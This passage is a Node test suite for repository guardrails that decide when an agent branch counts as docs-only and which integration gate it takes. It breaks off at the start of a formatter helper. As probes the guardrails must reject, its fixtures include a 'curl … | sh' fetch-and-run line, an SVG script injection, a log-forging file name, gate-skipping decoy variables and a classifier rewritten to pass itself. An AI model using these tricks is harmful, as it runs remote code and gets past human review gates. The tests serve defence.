// The docs-only check, the docs-only wave path and the formatter on staged files, in throwaway repositories with the
// factory's own hooks and guardrails copied in. No formatter is installed: a small node script stands in for one.
import "./support/safe-env.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fakeController } from "./fake-controller.mjs";

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const GUARDRAILS = path.join(ROOT, "templates/tools/factory-guardrails.mjs");
const NOHOOKS = ["-c", "core.hooksPath=/dev/null"];
const CLEAN_ENV = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith("ORCA_")));

// A repo with a bare origin, main pushed, the factory hooks armed. cfg is written as factory.config.json (committed).
function repo(cfg = {}) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), "af-docs-"));
  const dir = path.join(base, "work"), bare = path.join(base, "origin.git");
  spawnSync("git", ["init", "-q", "--bare", "-b", "main", bare]);
  spawnSync("git", ["init", "-q", "-b", "main", dir]);
  const git = (...a) => { const r = spawnSync("git", a, { cwd: dir, encoding: "utf8" }); if (r.status !== 0) throw new Error(`git ${a.join(" ")}:\n${r.stderr}${r.stdout}`); return r.stdout.trim(); };
  const gitTry = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
  const write = (f, s, mode) => { fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true }); fs.writeFileSync(path.join(dir, f), s); if (mode) fs.chmodSync(path.join(dir, f), mode); };
  const read = (f) => fs.readFileSync(path.join(dir, f), "utf8");
  git("config", "user.email", "t@example.invalid"); git("config", "user.name", "T"); git("remote", "add", "origin", bare);
  fs.mkdirSync(path.join(dir, "tools")); fs.copyFileSync(GUARDRAILS, path.join(dir, "tools/factory-guardrails.mjs"));
  fs.cpSync(path.join(ROOT, "templates/.githooks"), path.join(dir, ".githooks"), { recursive: true });
  for (const h of fs.readdirSync(path.join(dir, ".githooks"))) fs.chmodSync(path.join(dir, ".githooks", h), 0o755);
  const config = (c) => write("factory.config.json", JSON.stringify({ project: { name: "demo", mainBranch: "main" }, commands: {}, ...c }, null, 2) + "\n");
  config(cfg);
  write("README.md", "# Demo\n"); write("docs/guide.md", "Guide\n"); write("src/app.js", "export const a = 1;\n"); write("package.json", "{}\n");
  git("add", "-A"); git("commit", "-qm", "init"); git("push", "-q", "origin", "main");
  git("config", "core.hooksPath", ".githooks");   // armed after the first commit: hooks and tools are protected files
  const check = (...a) => spawnSync("node", ["tools/factory-guardrails.mjs", "docs-only", ...a], { cwd: dir, encoding: "utf8" });
  // A new config on main (committed and pushed past the hooks, as a reviewed wave would place it).
  const setMain = (c) => { config(c); git("add", "factory.config.json"); git(...NOHOOKS, "commit", "-qm", "config"); git(...NOHOOKS, "push", "-q", "origin", "main"); };
  return { base, dir, git, gitTry, write, read, check, config, setMain };
}
// A branch from main with the given changes, committed without hooks in the way (the check reads commits only).
function branch(r, name, change) {
  r.git("checkout", "-q", "-b", name, "main"); change(); r.git("add", "-A");
  r.git(...NOHOOKS, "commit", "-qm", name); r.git("checkout", "-q", "main");
  return `main..${name}`;
}

test("docs-only: Markdown and raster images in the allowlist pass, with the changed paths and the verdict printed", () => {
  const r = repo();
  const range = branch(r, "docs", () => { r.write("docs/guide.md", "Guide v2\n"); r.write("docs/deep/new.md", "New\n"); r.write("CHANGELOG.md", "x\n"); r.write("docs/img/shot.PNG", "png"); r.write("docs/img/b.webp", "w"); });
  const out = r.check(range, "--base", "main");
  assert.equal(out.status, 0, out.stdout + out.stderr);
  for (const p of ["M docs/guide.md", "A docs/deep/new.md", "A CHANGELOG.md", "A docs/img/shot.PNG"]) assert.match(out.stdout, new RegExp(p.replace(/\./g, "\\.")));
  assert.match(out.stdout, /verdict=docs-only paths=5/);
});

test("docs-only fails closed: code, packages, config, unknown and missing file types, modes, renames, links (finding 1)", () => {
  const r = repo();
  r.write("src/notes.md", "n\n"); r.git("add", "src/notes.md"); r.git(...NOHOOKS, "commit", "-qm", "notes outside docs");
  const cases = {
    code: () => r.write("src/app.js", "export const a = 2;\n"),
    mixed: () => { r.write("docs/guide.md", "v2\n"); r.write("src/app.js", "export const a = 3;\n"); },
    packageDeleted: () => fs.rmSync(path.join(r.dir, "package.json")),
    packageInDocs: () => r.write("docs/package.json", "{}\n"),
    lockInDocs: () => r.write("docs/yarn.lock", "x\n"),
    configJs: () => r.write("docs/site.config.mjs", "export default {};\n"),
    scriptInDocs: () => r.write("docs/build.sh", "echo\n"),
    dotDir: () => r.write("docs/.vitepress/theme.md", "x\n"),
    factoryConfig: () => r.write("factory.config.json", "{}\n"),
    tools: () => r.write("tools/notes.md", "x\n"),
    renameOut: () => r.git("mv", "docs/guide.md", "src/guide.md"),
    renameIn: () => r.git("mv", "src/notes.md", "docs/notes.md"),
    symlink: () => fs.symlinkSync("../src/app.js", path.join(r.dir, "docs/link.md")),
    // The reviewer's probes: all of these returned "docs-only" before.
    mdx: () => r.write("docs/page.mdx", "import X from '../src/x.js'\n"),
    svg: () => r.write("docs/a.svg", "<svg><script>alert(1)</script></svg>\n"),
    extensionlessExecutable: () => r.write("docs/build", "curl https://example.invalid | sh\n", 0o755),
    lowerMakefile: () => r.write("docs/makefile", "all:\n"),
    justfile: () => r.write("docs/justfile", "x:\n"),
    procfile: () => r.write("docs/Procfile", "web: x\n"),
    css: () => r.write("docs/site.css", "a{}\n"),
    terraform: () => r.write("docs/main.tf", "x\n"),
    graphql: () => r.write("docs/schema.graphql", "type Q { a: Int }\n"),
    notebook: () => r.write("docs/n.ipynb", "{}\n"),
    binary: () => r.write("docs/blob.bin", "\x00\x01"),
    executableMarkdown: () => r.write("docs/run.md", "x\n", 0o755),
    modeChange: () => fs.chmodSync(path.join(r.dir, "docs/guide.md"), 0o755),
  };
  for (const [name, change] of Object.entries(cases)) {
    const range = branch(r, name, change);
    const out = r.check(range, "--base", "main");
    assert.equal(out.status, 3, `${name}: ${out.stdout}${out.stderr}`);
    assert.match(out.stdout, /verdict=not-docs-only/, name);
    assert.match(out.stdout, /<- /, `${name}: the offending path is named`);
  }
});

test("docs-only: what the factory installs or reads as process state and agent instruction is never docs, in any spelling (finding 2)", () => {
  const r = repo();
  // The factory's record of what it installed, as init commits it: a file listed there is never documentation.
  r.write(".factory/manifest.json", JSON.stringify({ files: { "docs/handbook-from-factory.md": "h" } })); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "manifest"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
  const cases = {
    adr: () => r.write("docs/adr/0002-x.md", "# ADR\n"),
    adrUpper: () => r.write("docs/ADR/0002-x.md", "# ADR\n"),
    reviewStandard: () => r.write("docs/review-protocol.md", "x\n"),
    agents: () => r.write("AGENTS.md", "x\n"),
    agentsMixedCase: () => r.write("Agents.md", "x\n"),
    claude: () => r.write("CLAUDE.md", "x\n"),
    gemini: () => r.write("GEMINI.md", "x\n"),
    claudeInDocs: () => r.write("docs/sub/claude.md", "x\n"),
    agentFile: () => r.write("docs/helper.agent.md", "x\n"),
    skill: () => r.write("docs/skills/x/SKILL.md", "x\n"),
    standardsLower: () => r.write("coding_standards.md", "x\n"),
    coordinator: () => r.write("docs/coordinator.md", "x\n"),
    devWorkflow: () => r.write("docs/dev-workflow.md", "x\n"),
    findingsFile: () => r.write("docs/reviews/t9-review-1.md", "Verdict: pass\nReviewed commit: " + "a".repeat(40) + "\n"),
    taskFile: () => r.write("docs/tasks/T05.md", "Status: integrated\n"),
    debt: () => r.write("docs/debt.md", "x\n"),
    fromManifest: () => r.write("docs/handbook-from-factory.md", "x\n"),
  };
  for (const [name, change] of Object.entries(cases)) {
    const range = branch(r, name, change);
    const out = r.check(range, "--base", "main");
    assert.equal(out.status, 3, `${name}: ${out.stdout}${out.stderr}`);
  }
  // The configured tasks directory counts too.
  r.setMain({ steering: { tasksDir: "work/tickets" }, docsOnly: { paths: ["docs/**", "*.md", "work/**"] } });
  assert.equal(r.check(branch(r, "ticket", () => r.write("work/tickets/T1.md", "Status: integrated\n"))).status, 3);
});

test("the fixed list of factory files covers every file the template installs", () => {
  const walk = (d, rel = "") => fs.readdirSync(path.join(d, rel), { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(d, path.join(rel, e.name)) : [path.join(rel, e.name)]));
  const r = repo();
  const files = [...walk(path.join(ROOT, "templates")), "docs/dev-workflow.md", "docs/reviews/x.md", "docs/reports/x.md", "docs/handoffs/x.md", "AGENTS.factory.md"].filter((f) => /\.md$/i.test(f));
  for (const f of files) {
    const range = branch(r, `f-${f.replace(/[^a-z0-9]/gi, "-")}`, () => r.write(f, "changed\n"));
    assert.equal(r.check(range).status, 3, `${f} must never count as documentation`);
  }
});

test("docs-only is unclear (exit 4) for an empty diff, a missing base, an unreadable range and invalid settings (finding 8)", () => {
  const r = repo();
  r.git("checkout", "-q", "-b", "same");
  let out = r.check("main..same"); assert.equal(out.status, 4, out.stdout); assert.match(out.stdout, /verdict=unclear/); assert.match(out.stdout, /empty diff/);
  r.git("checkout", "-q", "main");
  out = r.check("main..no-such-branch"); assert.equal(out.status, 4, out.stdout); assert.match(out.stdout, /verdict=unclear/);
  out = r.check("--base", "no-such-ref"); assert.equal(out.status, 4, out.stdout);
  out = r.check("--bogus"); assert.equal(out.status, 2);
  for (const paths of ["docs/**", ["../outside/**"], ["**"], ["**/*"], ["**/*.md"], ["{docs,src,scripts}/**"], ["*/x.md"]]) {
    r.setMain({ docsOnly: { paths } });
    out = r.check(branch(r, `p${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`)));
    assert.equal(out.status, 4, `${JSON.stringify(paths)}: ${out.stdout}`); assert.match(out.stdout, /docsOnly\.paths must be/);
  }
  r.setMain({ docsOnly: { extraTypes: ["js"] } });
  out = r.check(branch(r, "et", () => r.write("docs/guide.md", "v9\n"))); assert.equal(out.status, 4); assert.match(out.stdout, /extraTypes/);
});

test("docs-only reads its settings from the base, not from the candidate; .svg and .mdx only by opt-in", () => {
  const r = repo();
  const inHandbook = branch(r, "hb", () => r.write("handbook/intro.md", "x\n"));
  assert.equal(r.check(inHandbook).status, 3, "default allowlist: handbook/ is not documentation");
  const selfWidening = branch(r, "sw", () => { r.config({ docsOnly: { paths: ["handbook/**"] } }); r.write("handbook/intro.md", "x\n"); });
  assert.equal(r.check(selfWidening).status, 3, "a candidate cannot widen its own allowlist");
  r.write("factory.config.json", JSON.stringify({ docsOnly: { paths: ["handbook/**"] } }));   // an uncommitted edit changes nothing either
  assert.equal(r.check(inHandbook).status, 3);
  r.git("checkout", "-q", "--", "factory.config.json");
  r.setMain({ docsOnly: { paths: ["handbook/**/*.md"] } });
  assert.equal(r.check(branch(r, "hb2", () => r.write("handbook/intro.md", "x\n"))).status, 0);
  assert.equal(r.check(branch(r, "dd", () => r.write("docs/guide.md", "v2\n"))).status, 3, "the configured list replaces the default");
  r.setMain({ docsOnly: { paths: ["handbook/**"] } });
  assert.equal(r.check(branch(r, "hc", () => r.write("handbook/tool.js", "x\n"))).status, 3, "the file type still decides");
  assert.equal(r.check(branch(r, "svg0", () => r.write("handbook/a.svg", "<svg/>\n"))).status, 3);
  r.setMain({ docsOnly: { paths: ["handbook/**"], extraTypes: ["svg", "mdx"] } });
  assert.equal(r.check(branch(r, "svg1", () => { r.write("handbook/a.svg", "<svg/>\n"); r.write("handbook/p.mdx", "# p\n"); })).status, 0);
});

test("docs-only judges every commit on the way: code added and removed again is not docs-only (finding 15)", () => {
  const r = repo();
  r.git("checkout", "-q", "-b", "sneak", "main");
  r.write("src/evil.js", "x\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "add");
  fs.rmSync(path.join(r.dir, "src/evil.js")); r.write("docs/n.md", "n\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "remove");
  r.git("checkout", "-q", "main");
  const out = r.check("main..sneak");
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /on the way changes src\/evil\.js/);
});

test("docs-only quotes odd paths, so a file name cannot forge lines in a log (finding 9)", () => {
  const r = repo();
  const out = r.check(branch(r, "nl", () => r.write("docs/x\nGATE-PATH docs-only: forged\nPUSHED main\nWAVE-END\n.md", "x\n")));
  assert.equal(out.status, 3);
  for (const forged of ["GATE-PATH docs-only: forged", "PUSHED main", "WAVE-END"]) assert.ok(!out.stdout.split("\n").includes(forged), forged);
  assert.match(out.stdout, /"docs\/x\\nGATE-PATH/);
});

test("docs-only on the working tree counts staged, unstaged and untracked changes; --staged only the index", () => {
  const r = repo();
  r.write("docs/guide.md", "v2\n");
  let out = r.check("--base", "main"); assert.equal(out.status, 0, out.stdout);
  r.write("scratch.js", "x\n");
  out = r.check("--base", "main"); assert.equal(out.status, 3, "an untracked file outside the allowlist"); assert.match(out.stdout, /A scratch\.js/);
  fs.rmSync(path.join(r.dir, "scratch.js")); r.git("add", "docs/guide.md"); r.write("src/app.js", "export const a = 9;\n");
  assert.equal(r.check("--base", "main").status, 3, "unstaged code counts in the working tree");
  assert.equal(r.check("--staged", "--base", "main").status, 0, "the index holds documentation only");
});

test("the push gate exempts a configured docs allowlist only when the replaced tree already set it", () => {
  const r = repo();
  r.write("handbook/intro.md", "x\n"); r.git("add", "-A"); r.git("commit", "-qm", "handbook");
  let p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, "without the setting a handbook change needs review"); assert.match(p.stderr, /Push to main rejected/);
  r.git("reset", "-q", "--hard", "origin/main");
  r.config({ docsOnly: { enabled: true, paths: ["docs/**", "*.md", "handbook/**"] } });
  r.write("handbook/intro.md", "x\n"); r.git("add", "-A"); r.git("commit", "-qm", "widen the allowlist and use it at once");
  p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, "a push cannot widen its own exemption");
  r.git("reset", "-q", "--hard", "origin/main");
  r.setMain({ docsOnly: { enabled: true, paths: ["docs/**", "*.md", "handbook/**"] } });
  r.write("handbook/intro.md", "y\n"); r.git("add", "-A"); r.git("commit", "-qm", "handbook");
  p = r.gitTry("push", "-q", "origin", "main"); assert.equal(p.status, 0, p.stderr);
  for (const [f, mode] of [["handbook/run.sh", undefined], ["handbook/deploy", 0o755], ["handbook/app.css", undefined], ["handbook/CLAUDE.md", undefined]]) {
    r.write(f, "echo\n", mode); r.git("add", "-A"); r.git("commit", "-qm", f);
    p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, `${f} under the allowlist still needs review`);
    r.git("reset", "-q", "--hard", "origin/main");
  }
});

// --- the wave ----------------------------------------------------------------------------------
function wave(r, branches, { gate: gateBody = "#!/bin/sh\nexit 1\n", env = {}, logs = path.join(r.base, `logs-${Date.now()}`), verify = "exit 1", e2e = "", ctl: ctlOpts = {} } = {}) {
  for (const b of branches) r.git("push", "-q", "origin", b);
  const integ = path.join(r.base, "integration");
  r.git("worktree", "add", "-q", "-B", "integration", integ, "origin/main");
  const ctl = fakeController(r.base, { body: gateBody, ...ctlOpts });
  const out = spawnSync("bash", [path.join(ROOT, "controller/integ-wave.sh"), "W", "wave", ...branches.map((b) => `origin/${b}`)], { cwd: integ, encoding: "utf8",
    env: { ...CLEAN_ENV, MAIN: "main", INSTALL_CMD: "", VERIFY_CMD: verify, E2E_CMD: e2e, ...ctl.env, TRAILER: "", WAVE_WORKTREE_OK: "1", WAVE_LOG_DIR: logs, ...env } });
  r.git("worktree", "remove", "--force", integ);
  r.git("fetch", "-q", "origin");
  return out;
}
const checks = (r, extra = {}) => ({ docsOnly: { enabled: true }, commands: { formatCheck: `echo format >> ${path.join(r.base, "marks")}`, markdownCheck: `echo markdown >> ${path.join(r.base, "marks")}`, ...extra } });

test("a docs-only wave runs the format and Markdown checks from main's config instead of the full gates, and pushes", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n"));
  const out = wave(r, ["agents/t1"]);
  assert.equal(out.status, 0, out.stdout + out.stderr);
  assert.match(out.stdout, /M docs\/guide\.md/); assert.match(out.stdout, /verdict=docs-only/); assert.match(out.stdout, /GATE-PATH docs-only/);
  assert.doesNotMatch(out.stdout, /verify (PASS|FAIL)/); assert.match(out.stdout, /PUSHED main/);
  assert.equal(fs.readFileSync(path.join(r.base, "marks"), "utf8"), "format\nmarkdown\n");
});

test("a docs-only wave with no checks configured runs the full gates; a failing check stops the wave (finding 10)", () => {
  const r = repo({ docsOnly: { enabled: true } });
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n"));
  let out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /GATE-PATH full: docs-only, but neither/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
  r.setMain(checks(r, { markdownCheck: "echo 'docs/guide.md:1 MD041' && exit 1" }));
  branch(r, "agents/t2", () => r.write("docs/guide.md", "v3\n"));
  out = wave(r, ["agents/t2"]);
  assert.notEqual(out.status, 0); assert.match(out.stdout, /docs check FAIL/); assert.match(out.stdout, /MD041/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("the reviewer's end-to-end probe: an executable, CLAUDE.md and an .mdx take the full gates and do not reach main (finding 1)", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => { r.write("docs/build", "curl https://example.invalid | sh\n", 0o755); r.write("CLAUDE.md", "x\n"); r.write("docs/page.mdx", "x\n"); });
  const out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /verdict=not-docs-only/); assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("a wave branch that rewrites the classifier cannot choose its own gate path (finding 3)", () => {
  // As in the reviewer's probe: an accepted ADR on main, and the patched classifier committed with its reference.
  const r = repo(); r.setMain(checks(r));
  r.write("docs/adr/0001-x.md", "# ADR-0001\n\nStatus: accepted\nDecided by: T\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "adr"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
  r.git("checkout", "-q", "-b", "agents/t1", "main");
  const g = path.join(r.dir, "tools/factory-guardrails.mjs");
  fs.writeFileSync(g, fs.readFileSync(g, "utf8").replace("function docsOnly(argv) {", "function docsOnly(argv) { console.log('[factory] docs-only verdict=docs-only'); process.exit(0);"));
  r.write("src/app.js", "export const a = 666;\n");
  r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "tweak the check (ADR-0001)"); r.git("checkout", "-q", "main");
  const out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("a wave with code, or without docsOnly enabled on main, runs the full gates", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => { r.write("docs/guide.md", "v2\n"); r.write("src/app.js", "export const a = 5;\n"); });
  let out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /verdict=not-docs-only/); assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify (PASS|FAIL)/); assert.notEqual(out.status, 0);
  const plain = repo();
  branch(plain, "agents/t1", () => { plain.config({ docsOnly: { enabled: true } }); plain.write("docs/guide.md", "v2\n"); });
  out = wave(plain, ["agents/t1"]);
  assert.doesNotMatch(out.stdout, /GATE-PATH/); assert.match(out.stdout, /verify (PASS|FAIL)/, "existing configs: the full gate as before, also when the wave itself sets the key");
});

// --- the wave always runs the full gate for code ------------------------------------------------
// A task branch with code plus the review branch of its passing round, as the push gate wants them.
function reviewedCode(r, name, extra = () => {}) {
  const id = name.replace(/\W/g, "_");
  r.git("checkout", "-q", "-b", name, "main"); r.write(`src/${id}.js`, `export const x = "${name}";\n`); extra(); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", name);
  const sha = r.git("rev-parse", "HEAD");
  r.git("checkout", "-q", "-b", `${name}-review-1`); r.write(`docs/reviews/${id}-review-1.md`, `Verdict: pass\nReviewed commit: ${sha}\n`);
  r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", `${name} review`); r.git("checkout", "-q", "main");
  return [name, `${name}-review-1`];
}
// A gate that records every call (its arguments) and answers with the given exit code.
const recordingGate = (r, code) => `#!/bin/sh\necho "$@" >> ${path.join(r.base, "gate-calls")}\nexit ${code}\n`;
const gateCalls = (r) => { try { return fs.readFileSync(path.join(r.base, "gate-calls"), "utf8").trim().split("\n").filter(Boolean); } catch { return []; } };
const docsRepo = () => { const r = repo(); r.setMain(checks(r)); return r; };

test("a code change always runs the full gate in the wave, whatever earlier results, files or variables exist", () => {
  const r = docsRepo();
  const decoys = { GATE_CACHE: "1", GATE_RESULT: "pass", GATE_SKIP: "1", SKIP_GATE: "1", WAVE_SKIP_GATE: "1", WAVE_GATE_PASSED: "1", FACTORY_GATE_REUSE: "1", CI: "true", VERIFIED_TREE: "*" };
  const logs = path.join(r.base, "wave-logs"); fs.mkdirSync(logs, { recursive: true });
  // earlier results where a lazy implementation might look: the step logs of an earlier wave, a result file next to them
  fs.writeFileSync(path.join(logs, "wave-verify.log"), "verify PASS\n"); fs.writeFileSync(path.join(logs, "gate-result.json"), JSON.stringify({ verdict: "pass" }));
  const t1 = reviewedCode(r, "agents/t1", () => { r.write("gate-result.json", JSON.stringify({ verdict: "pass", tree: "any" })); r.write("docs/evidence-verify-pass.md", "verify PASS, e2e PASS\n"); });
  // the gate fails: no push, and main is where it was
  const before = r.git("rev-parse", "origin/main");
  let out = wave(r, t1, { gate: recordingGate(r, 1), env: decoys, logs, verify: "echo verify-cmd" });
  assert.notEqual(out.status, 0); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
  assert.equal(r.git("rev-parse", "origin/main"), before, "a failing gate blocks the push");
  assert.deepEqual(gateCalls(r), ["bash -c echo verify-cmd"]);
  // the same candidate again, with the earlier (failed) run's logs in place: it is gated again, and pushed on success
  out = wave(r, t1, { gate: recordingGate(r, 0), env: decoys, logs, verify: "echo verify-cmd" });
  assert.equal(out.status, 0, out.stdout + out.stderr); assert.match(out.stdout, /verify PASS/); assert.match(out.stdout, /PUSHED main/);
  assert.equal(gateCalls(r).length, 2, "no result by tree is reused");
  assert.notEqual(r.git("rev-parse", "origin/main"), before);
  // a second code change: one more full gate
  const t2 = reviewedCode(r, "agents/t2");
  out = wave(r, t2, { gate: recordingGate(r, 0), env: decoys, verify: "echo verify-cmd" });
  assert.match(out.stdout, /PUSHED main/); assert.equal(gateCalls(r).length, 3);
});

test("a failing gate blocks the push for a code change, also with docsOnly enabled and a docs file in the wave", () => {
  const r = docsRepo();
  const t = reviewedCode(r, "agents/t1", () => r.write("docs/guide.md", "v2\n"));
  const before = r.git("rev-parse", "origin/main");
  const out = wave(r, t, { gate: recordingGate(r, 3), verify: "true" });
  assert.notEqual(out.status, 0); assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
  assert.equal(r.git("rev-parse", "origin/main"), before); assert.equal(gateCalls(r).length, 1);
  assert.equal(fs.existsSync(path.join(r.base, "marks")), false, "the docs checks did not stand in for the gate");
});

test("the wave's gate must be this project's own: a bare or relative name, another name, a foreign or unconfigured directory, or one inside the worktree stops the wave before anything is merged", () => {
  const r = repo(); const t = reviewedCode(r, "agents/t1");
  for (const b of t) r.git("push", "-q", "origin", b);
  const integ = path.join(r.base, "integration");
  r.git("worktree", "add", "-q", "-B", "integration", integ, "origin/main");
  const good = fakeController(r.base);
  const other = fakeController(r.base, { project: "other" });
  const noCfg = fakeController(r.base, { project: "nocfg", config: false });
  const renamed = fakeController(r.base, { project: "demo2", name: "tool" });
  const inside = path.join(integ, "gate"); fs.writeFileSync(inside, "#!/bin/sh\nexec \"$@\"\n", { mode: 0o755 }); fs.writeFileSync(path.join(integ, "factory.config.json"), JSON.stringify({ project: { name: "demo" } }));
  const cases = [["gate", "demo"], ["env", "demo"], ["./gate", "demo"], [path.join(r.base, "nope"), "demo"], ["/usr/bin/true", "demo"], [other.gate, "demo"], [noCfg.gate, "demo"], [noCfg.gate, "nocfg"], [renamed.gate, "demo2"], [inside, "demo"], [good.gate, ""], [path.dirname(good.gate), "demo"]];
  for (const [gate, project] of cases) {
    const out = spawnSync("bash", [path.join(ROOT, "controller/integ-wave.sh"), "W", "wave", ...t.map((b) => `origin/${b}`)], { cwd: integ, encoding: "utf8", env: { ...CLEAN_ENV, MAIN: "main", VERIFY_CMD: "true", GATE: gate, WAVE_PROJECT: project, WAVE_WORKTREE_OK: "1", WAVE_LOG_DIR: path.join(r.base, "l") } });
    assert.notEqual(out.status, 0, gate + " as " + project); assert.match(out.stderr, /GATE \(.*\) is refused/, gate + " as " + project); assert.doesNotMatch(out.stdout, /merged|PUSHED/);
  }
  const ok = spawnSync("bash", [path.join(ROOT, "controller/integ-wave.sh"), "W", "wave", "origin/agents/nope"], { cwd: integ, encoding: "utf8", env: { ...CLEAN_ENV, MAIN: "main", VERIFY_CMD: "true", ...good.env, WAVE_WORKTREE_OK: "1", WAVE_LOG_DIR: path.join(r.base, "l2") } });
  assert.doesNotMatch(ok.stderr, /is refused/, "the project's own gate passes the check");
  r.git("worktree", "remove", "--force", integ);
});

test("whitespace-only commands behave as empty ones do: verify stops the wave, e2e is skipped, blank docs checks are not configured", () => {
  const r = docsRepo(); const t = reviewedCode(r, "agents/t1");
  let out = wave(r, t, { gate: recordingGate(r, 0), verify: " \t " });
  assert.notEqual(out.status, 0); assert.match(out.stdout, /VERIFY-MISSING/); assert.doesNotMatch(out.stdout, /PUSHED|merged/);
  // e2e: empty and whitespace-only are both skipped (one gate call, pushed); a real command runs a second one
  for (const [e2e, calls] of [["", 1], ["  \t", 1], ["echo e2e", 2]]) {
    const x = docsRepo(); const tx = reviewedCode(x, "agents/t1");
    out = wave(x, tx, { gate: recordingGate(x, 0), verify: "true", e2e });
    assert.match(out.stdout, /PUSHED main/, JSON.stringify(e2e)); assert.equal(gateCalls(x).length, calls, JSON.stringify(e2e));
    assert.equal(/e2e PASS/.test(out.stdout), calls === 2);
  }
  // blank docs checks are no checks: a docs-only wave then takes the full gate
  const d = repo(); d.setMain({ docsOnly: { enabled: true }, commands: { formatCheck: "  ", markdownCheck: " " } }); branch(d, "agents/d1", () => d.write("docs/guide.md", "v2\n"));
  out = wave(d, ["agents/d1"], { gate: recordingGate(d, 0), verify: "true" });
  assert.match(out.stdout, /GATE-PATH full: docs-only, but neither/); assert.equal(gateCalls(d).length, 1);
});

test("docsOnly.enabled counts only as the JSON boolean true: the string \"true\" runs the full gate, as docsonly.mjs does", () => {
  const r = repo(); r.setMain({ ...checks(r), docsOnly: { enabled: "true" } }); branch(r, "agents/d1", () => r.write("docs/guide.md", "v2\n"));
  const out = wave(r, ["agents/d1"], { gate: recordingGate(r, 0), verify: "true" });
  assert.doesNotMatch(out.stdout, /GATE-PATH docs-only/); assert.doesNotMatch(out.stdout, /docs check/); assert.match(out.stdout, /verify PASS/); assert.equal(gateCalls(r).length, 1);
});

test("only the docs-only check skips the full gate: not docs-only, unclear, a missing check and no configured checks all run it", () => {
  // docs-only and decided so by main's check: the gate is not called at all
  let r = docsRepo(); branch(r, "agents/d1", () => r.write("docs/guide.md", "v2\n"));
  let out = wave(r, ["agents/d1"], { gate: recordingGate(r, 1) });
  assert.equal(out.status, 0, out.stdout); assert.match(out.stdout, /GATE-PATH docs-only/); assert.deepEqual(gateCalls(r), []);
  // docs-only but no docs checks configured: full gate
  r = repo({ docsOnly: { enabled: true } }); branch(r, "agents/d1", () => r.write("docs/guide.md", "v2\n"));
  out = wave(r, ["agents/d1"], { gate: recordingGate(r, 0) });
  assert.match(out.stdout, /GATE-PATH full: docs-only, but neither/); assert.equal(gateCalls(r).length, 1);
  // docsOnly off on main: a docs change takes the full gate as before
  r = repo({ commands: { formatCheck: "true" } }); branch(r, "agents/d1", () => r.write("docs/guide.md", "v2\n"));
  out = wave(r, ["agents/d1"], { gate: recordingGate(r, 0) });
  assert.doesNotMatch(out.stdout, /GATE-PATH docs-only/); assert.equal(gateCalls(r).length, 1);
  // an unclear verdict (an invalid allowlist on main): full gate
  r = repo(); r.setMain({ ...checks(r), docsOnly: { enabled: true, paths: ["**"] } }); branch(r, "agents/d1", () => r.write("docs/guide.md", "v2\n"));
  out = wave(r, ["agents/d1"], { gate: recordingGate(r, 0) });
  assert.match(out.stdout, /verdict=unclear/); assert.match(out.stdout, /GATE-PATH full/); assert.equal(gateCalls(r).length, 1);
  // mixed with code (not docs-only): full gate
  r = docsRepo(); branch(r, "agents/d1", () => { r.write("docs/guide.md", "v2\n"); r.write("src/app.js", "export const a = 2;\n"); });
  out = wave(r, ["agents/d1"], { gate: recordingGate(r, 0) });
  assert.match(out.stdout, /GATE-PATH full/); assert.equal(gateCalls(r).length, 1);
});

test("the commit hook's docs shortcut says what it is, with docsOnly on or off", () => {
  for (const cfg of [{}, { docsOnly: { enabled: true } }]) {
    const r = repo(cfg); r.write("docs/guide.md", "v2\n"); r.git("add", "-A");
    const out = spawnSync("git", ["commit", "-qm", "docs"], { cwd: r.dir, encoding: "utf8", env: CLEAN_ENV });
    assert.equal(out.status, 0, out.stdout + out.stderr);
    const text = out.stdout + out.stderr;
    assert.match(text, /only files under docs\/ or top-level Markdown staged: typecheck and lint skipped for this commit/); assert.match(text, /not the docs-only gate path/); assert.match(text, /full gate for code/);
    assert.doesNotMatch(text, /documentation-only commit/);
  }
});

// --- format-staged-----------------------------------------------------------------------------
// The stand-in formatter: replaces "messy" by "tidy" in each file it gets, logs its arguments, fails on "broken".
function formatter(r, { slow = false } = {}) {
